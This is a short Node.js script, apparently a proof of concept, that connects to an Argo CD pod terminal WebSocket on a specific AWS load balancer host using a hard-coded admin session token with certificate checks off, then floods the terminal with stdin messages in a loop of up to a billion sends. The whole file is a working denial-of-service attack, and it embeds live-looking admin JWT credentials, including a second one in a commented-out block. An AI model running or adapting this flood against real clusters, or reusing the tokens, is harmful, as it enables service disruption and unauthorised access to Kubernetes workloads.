const WebSocket = require('ws');

const ws = new WebSocket('ws://ab73b4b8640284470834463903f3667f-1857913852.us-east-1.elb.amazonaws.com/terminal?pod=guestbook-ui-696ff46b84-m47kf&container=guestbook-ui&appName=guestbook&appNamespace=argocd&projectName=default&namespace=guestbook',
    {
        headers: {
            'Cookie': 'argocd.token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhcmdvY2QiLCJzdWIiOiJhZG1pbjpsb2dpbiIsImV4cCI6MTcyMDg4MTAyNywibmJmIjoxNzIwNzk0NjI3LCJpYXQiOjE3MjA3OTQ2MjcsImp0aSI6IjY0ZWFiZTUzLTFmZWMtNGFhYy1hODE3LWQyMDU1M2Q1ZWEzYSJ9.ympMUydLwpz9Q2JA680e3at1LLoj0oU7R7e3KDadr5M',
        },
        rejectUnauthorized: false,
    });

// const ws = new WebSocket('ws://localhost:8080/terminal?pod=guestbook-ui-696ff46b84-m47kf&container=guestbook-ui&appName=guestbook&appNamespace=argocd&projectName=default&namespace=guestbook',
//     {
//         headers: {
//             'Cookie': 'argocd.token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhcmdvY2QiLCJzdWIiOiJhZG1pbjpsb2dpbiIsImV4cCI6MTcyMDc4OTkyMiwibmJmIjoxNzIwNzAzNTIyLCJpYXQiOjE3MjA3MDM1MjIsImp0aSI6IjY3YmJmMmJhLWQ3MjAtNDJiOS04NzBiLWIzYzc5YzUxZWRkNyJ9.uvPOouiyhyo44vwZKA1Y16JM5wr7TIwxVdoj9Yjqg7A'
//         },
//         rejectUnauthorized: false,
//     });
ws.on('open', async function open() {
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms))
    console.log('connected');
    for (let i = 0; i < 1000000000; i ++) {
        ws.send(JSON.stringify({
            operation: 'stdin',
            data: 'p',
        }));/// waiting 1 second.
        console.log(i)
    }
});

ws.on('close', function close() {
    console.log('disconnected');
});

ws.on('message', function message(data) {
    console.log('received: %s', data);
});

ws.on('error', function error(err) {
    console.log(err)
})
